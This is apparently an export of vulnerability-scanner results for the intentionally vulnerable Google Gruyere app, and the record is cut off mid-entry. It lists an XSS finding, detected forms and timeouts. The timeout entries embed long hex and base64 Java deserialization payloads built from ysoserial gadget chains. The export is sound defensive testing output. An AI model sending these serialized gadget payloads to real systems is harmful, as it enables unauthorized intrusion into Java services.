Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"b1aacd53-52e1-49aa-bb28-a4716a6a183e",2022-03-15T18:42:41.743Z,2022-03-15T16:54:38Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newaccount.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"b1e6456b-804f-4716-b143-9b73861b4f70",2022-03-15T21:06:17.432Z,2022-03-15T19:53:22Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/656501648683287335357107855369111942818/login with input fields : 
- uid (text)
- pw (password)

This form is submitted by using the following action : https://google-gruyere.appspot.com/656501648683287335357107855369111942818/login",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"b282d058-1b00-49cb-a2cb-e82db27c851e",2022-03-15T21:06:17.432Z,2022-03-15T19:23:39Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/563265819128830739647592760263700851280/upload.gtl with input fields : 
- upload_file (file)

This form is submitted by using the following action : https://google-gruyere.appspot.com/563265819128830739647592760263700851280/upload2",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"b4bf511a-ed8a-4725-a674-0a84afcfb61b",2022-03-15T21:06:17.432Z,2022-03-15T19:01:45Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/563265819128830739647592760263700851280/editprofile.gtl with input fields : 
- private_snippet (no type specified)
- action (hidden)
- name (text)
- oldpw (password)
- pw (password)
- icon (text)
- web_site (text)
- color (text)

This form is submitted by using the following action : http://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Provides a report of network timeouts encountered during the scan, showing URLs and the number of timeouts for each URL.

Note that assessment will stop on any URLs in timeout state, and timeouts may increase significantly the overall duration of the scan.",General,98019,"Network Timeout Encountered",,2017-09-25T00:00:00Z,2017-09-25T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,"Check your web application logs and verify that it is functioning as expected and can handle significant amounts of traffic generated by the scanner.
Additionally, the scan policy may be edited to optimize the performance settings.",,"b535b9e3-85a1-45f0-ab1d-c01a7b867ca5",2022-03-15T18:42:41.743Z,2022-03-15T18:42:40Z,"17 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/'
14 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/feed.gtl'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login?uid=aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72fbf49925b86eb13702000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e0020000787000000634cafebabe0000003300330a0003002207003107002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100106a6176612f6c616e672f54687265616407002a010005736c656570010004284a29560c002c002d0a002b002e01000d537461636b4d61705461626c6501001a74656e61626c652f57415334383733303232383537343935353901001c4c74656e61626c652f5741533438373330323238353734393535393b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002e000e0000000c000100000005000f003200000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0032000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000037000e0000002a000400000001000f003200000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c00000022000300020000000da70003014c11138885b8002fb1000000010030000000030001030002002000000002002100110000000a000100020023001000097571007e0010000001d4cafebabe00000033001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003b000e0000000c000100000005000f001200000002001300000002001400110000000a0001000200160010000970740003574153707701007871007e000d78&pw=nessus_was_textrwtie36p'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login?uid=H4sIAH7CMGIAA61WTWwbRRR+YyfexDht/v9aaJoSSFK6G+JEaXBEyE9/XBwSZJMefLDG68HZsn+dnaUOBw5ISL0iuHBEQnAgPURCouKAxJVzTyAkJCQOSMChHJAqft7sbuIkpMQtseSd2fc789733tutX6DZ49B3g75JVV8YprrGDYcbYvNVn/nsg28nPn8w/852HGJZaPKMt1gOkrpjuZRT4XABvTmpqUlNbWmXnqm5ABBDw+cdXlWpS/UNpqKe5dieWmbUlgqeuoi7utaPH93+2Rv++GoMYvu83IS3geSgxeWOy7jYFNAZejWpXdXyght2FT2it/lDvOmOaTJdGOF+x6anRn7LJquf4MHvH47ctbdnYgA1V0C74wvXF2uhX4N5t5rwWnF09AJaUj3fVvc4rFE8j2rYgnGbmmrNM4WuCk5raoFZrkkF87K4tl5f/dre+iwdh0QW2kqGXWG2eMW3yoxn4UQJFWzPZCKL9FoRkqXypmC6U2GegHixuFiEREk3qYevncU9YViStEwOmks2tZgMWVMOOkoHb7A/Y3V6mDH4G38+Dxy9/OdAT7X6XRgLmU2kx4qLW/f7/ki0FH6IyImpb/768itkpyGdhDgMK/C8AiMKPEOg3WPcoOY64x5G/7XsMgFyjUDbEqZCUFusU9NnzXeG3r//3ve/vUggMWfYhsBNfHRsnUDTEt6awMmcYbMwPgWZLYLZd3Q0S9E4vkfEJrFheAS68sIvF6IYrtFN06EVAqmsbTMehIih0HRu03PCw2luKOOFAblCK1UmvKcPsZIh0Bok53WHWwT4aA4xoCEGNMSAFmJACzCg7WBACzCgLa+uZIqHSltmXTY8D1YY1/LRlkrUXqV2xWQ8I0PSUnF030K8ELjwSO5RdSO0g9df/P+HIZC8VNOZG5SVAs8S+OTR4nHkCSrC0pYLKws1w8siKegqxxNDIzIncfA4pyCgRLEksHAckcw7PtfZZUPCOBUhUJVFmoIkPKHAKIH0YwCWwEuNZoT7tjAspi2UPYS4LnYsEegOmoXh1A8fVNtso5Z3LO2ihcCZI+6CKZrTzagVtNc7XGGDM1pRYJzgyDIZc7HoR6+NrafgObiQhPOgYm/JC6q/sULdqCsMCmbLnXZ9IT91cSY9MTl5cXpmanZ6epbA6dzDuRk4CzHsZ+gD/4PQDAlcFdkHoSWgYWrwmUKKhivBtXn8CyDbgUgbPhMBUYUT+EyFAnASJnHFNgXdKCWV5+VEkbSDiulAcShkRopy1wO9AZ9AH/SjxgDuwzNKs6cis9mAeojZmcDseMg81OxpeBI15O4pOIPu6w5aYGz30sPIkVJtn0Kc5Dq6br97F7TtQG0iuBKR/KHA+1nowDWJrBicg3Zo9eV8akfZe7vT45ScHj0K9CnQr8BAo9Pj5k/Gr3PWlf7jmR7xy47zr2kxcuS0QK1G6niQwLkGTO0D/Wr5Bn68PLQOj6ql/0QxaRzFmQMo7gz4XcGze092e2V28cspjhXl3iJQk4luq/0DLYb0eWYKAAA=&pw=nessus_was_textgpv8zvjs'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login?uid=80&pw=H4sIAH7CMGIAA61WTWwbRRR+YyfexDht/v9aaJoSSFK6G+JEaXBEyE9/XBwSZJMefLDG68HZsn+dnaUOBw5ISL0iuHBEQnAgPURCouKAxJVzTyAkJCQOSMChHJAqft7sbuIkpMQtseSd2fc789733tutX6DZ49B3g75JVV8YprrGDYcbYvNVn/nsg28nPn8w/852HGJZaPKMt1gOkrpjuZRT4XABvTmpqUlNbWmXnqm5ABBDw+cdXlWpS/UNpqKe5dieWmbUlgqeuoi7utaPH93+2Rv++GoMYvu83IS3geSgxeWOy7jYFNAZejWpXdXyght2FT2it/lDvOmOaTJdGOF+x6anRn7LJquf4MHvH47ctbdnYgA1V0C74wvXF2uhX4N5t5rwWnF09AJaUj3fVvc4rFE8j2rYgnGbmmrNM4WuCk5raoFZrkkF87K4tl5f/dre+iwdh0QW2kqGXWG2eMW3yoxn4UQJFWzPZCKL9FoRkqXypmC6U2GegHixuFiEREk3qYevncU9YViStEwOmks2tZgMWVMOOkoHb7A/Y3V6mDH4G38+Dxy9/OdAT7X6XRgLmU2kx4qLW/f7/ki0FH6IyImpb/768itkpyGdhDgMK/C8AiMKPEOg3WPcoOY64x5G/7XsMgFyjUDbEqZCUFusU9NnzXeG3r//3ve/vUggMWfYhsBNfHRsnUDTEt6awMmcYbMwPgWZLYLZd3Q0S9E4vkfEJrFheAS68sIvF6IYrtFN06EVAqmsbTMehIih0HRu03PCw2luKOOFAblCK1UmvKcPsZIh0Bok53WHWwT4aA4xoCEGNMSAFmJACzCg7WBACzCgLa+uZIqHSltmXTY8D1YY1/LRlkrUXqV2xWQ8I0PSUnF030K8ELjwSO5RdSO0g9df/P+HIZC8VNOZG5SVAs8S+OTR4nHkCSrC0pYLKws1w8siKegqxxNDIzIncfA4pyCgRLEksHAckcw7PtfZZUPCOBUhUJVFmoIkPKHAKIH0YwCWwEuNZoT7tjAspi2UPYS4LnYsEegOmoXh1A8fVNtso5Z3LO2ihcCZI+6CKZrTzagVtNc7XGGDM1pRYJzgyDIZc7HoR6+NrafgObiQhPOgYm/JC6q/sULdqCsMCmbLnXZ9IT91cSY9MTl5cXpmanZ6epbA6dzDuRk4CzHsZ+gD/4PQDAlcFdkHoSWgYWrwmUKKhivBtXn8CyDbgUgbPhMBUYUT+EyFAnASJnHFNgXdKCWV5+VEkbSDiulAcShkRopy1wO9AZ9AH/SjxgDuwzNKs6cis9mAeojZmcDseMg81OxpeBI15O4pOIPu6w5aYGz30sPIkVJtn0Kc5Dq6br97F7TtQG0iuBKR/KHA+1nowDWJrBicg3Zo9eV8akfZe7vT45ScHj0K9CnQr8BAo9Pj5k/Gr3PWlf7jmR7xy47zr2kxcuS0QK1G6niQwLkGTO0D/Wr5Bn68PLQOj6ql/0QxaRzFmQMo7gz4XcGze092e2V28cspjhXl3iJQk4luq/0DLYb0eWYKAAA='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login?uid=&pw=H4sIAH7CMGIAA61WTWwbRRR+YyfexDht/v9aaJoSSFK6G+JEaXBEyE9/XBwSZJMefLDG68HZsn+dnaUOBw5ISL0iuHBEQnAgPURCouKAxJVzTyAkJCQOSMChHJAqft7sbuIkpMQtseSd2fc789733tutX6DZ49B3g75JVV8YprrGDYcbYvNVn/nsg28nPn8w/852HGJZaPKMt1gOkrpjuZRT4XABvTmpqUlNbWmXnqm5ABBDw+cdXlWpS/UNpqKe5dieWmbUlgqeuoi7utaPH93+2Rv++GoMYvu83IS3geSgxeWOy7jYFNAZejWpXdXyght2FT2it/lDvOmOaTJdGOF+x6anRn7LJquf4MHvH47ctbdnYgA1V0C74wvXF2uhX4N5t5rwWnF09AJaUj3fVvc4rFE8j2rYgnGbmmrNM4WuCk5raoFZrkkF87K4tl5f/dre+iwdh0QW2kqGXWG2eMW3yoxn4UQJFWzPZCKL9FoRkqXypmC6U2GegHixuFiEREk3qYevncU9YViStEwOmks2tZgMWVMOOkoHb7A/Y3V6mDH4G38+Dxy9/OdAT7X6XRgLmU2kx4qLW/f7/ki0FH6IyImpb/768itkpyGdhDgMK/C8AiMKPEOg3WPcoOY64x5G/7XsMgFyjUDbEqZCUFusU9NnzXeG3r//3ve/vUggMWfYhsBNfHRsnUDTEt6awMmcYbMwPgWZLYLZd3Q0S9E4vkfEJrFheAS68sIvF6IYrtFN06EVAqmsbTMehIih0HRu03PCw2luKOOFAblCK1UmvKcPsZIh0Bok53WHWwT4aA4xoCEGNMSAFmJACzCg7WBACzCgLa+uZIqHSltmXTY8D1YY1/LRlkrUXqV2xWQ8I0PSUnF030K8ELjwSO5RdSO0g9df/P+HIZC8VNOZG5SVAs8S+OTR4nHkCSrC0pYLKws1w8siKegqxxNDIzIncfA4pyCgRLEksHAckcw7PtfZZUPCOBUhUJVFmoIkPKHAKIH0YwCWwEuNZoT7tjAspi2UPYS4LnYsEegOmoXh1A8fVNtso5Z3LO2ihcCZI+6CKZrTzagVtNc7XGGDM1pRYJzgyDIZc7HoR6+NrafgObiQhPOgYm/JC6q/sULdqCsMCmbLnXZ9IT91cSY9MTl5cXpmanZ6epbA6dzDuRk4CzHsZ+gD/4PQDAlcFdkHoSWgYWrwmUKKhivBtXn8CyDbgUgbPhMBUYUT+EyFAnASJnHFNgXdKCWV5+VEkbSDiulAcShkRopy1wO9AZ9AH/SjxgDuwzNKs6cis9mAeojZmcDseMg81OxpeBI15O4pOIPu6w5aYGz30sPIkVJtn0Kc5Dq6br97F7TtQG0iuBKR/KHA+1nowDWJrBicg3Zo9eV8akfZe7vT45ScHj0K9CnQr8BAo9Pj5k/Gr3PWlf7jmR7xy47zr2kxcuS0QK1G6niQwLkGTO0D/Wr5Bn68PLQOj6ql/0QxaRzFmQMo7gz4XcGze092e2V28cspjhXl3iJQk4luq/0DLYb0eWYKAAA='
2 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login?uid=aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000007b74002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a61766174000e6765744f626a656374536c6565707371007e000b0000003371007e000d71007e000e71007e000f7371007e000b0000003074001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a78737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00017870767200106a6176612e6c616e672e546872656164000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000002740005736c656570757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200046c6f6e67000000000000000000000078707400096765744d6574686f647571007e003200000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00327371007e002b7571007e002f000000027571007e00320000000171007e00357571007e002f000000017372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b02000078700000000000000bb8740006696e766f6b657571007e003200000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e002f7371007e0027737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c75657871007e004000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878&pw=nessus_was_textrvyxckk2'
2 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login?uid=121&pw=aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000007b74002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a61766174000e6765744f626a656374536c6565707371007e000b0000003371007e000d71007e000e71007e000f7371007e000b0000003074001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a78737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00017870767200106a6176612e6c616e672e546872656164000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000002740005736c656570757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200046c6f6e67000000000000000000000078707400096765744d6574686f647571007e003200000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00327371007e002b7571007e002f000000027571007e00320000000171007e00357571007e002f000000017372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b02000078700000000000000bb8740006696e766f6b657571007e003200000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e002f7371007e0027737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c75657871007e004000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login?uid=&pw=aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000007b74002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a61766174000e6765744f626a656374536c6565707371007e000b0000003371007e000d71007e000e71007e000f7371007e000b0000003074001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001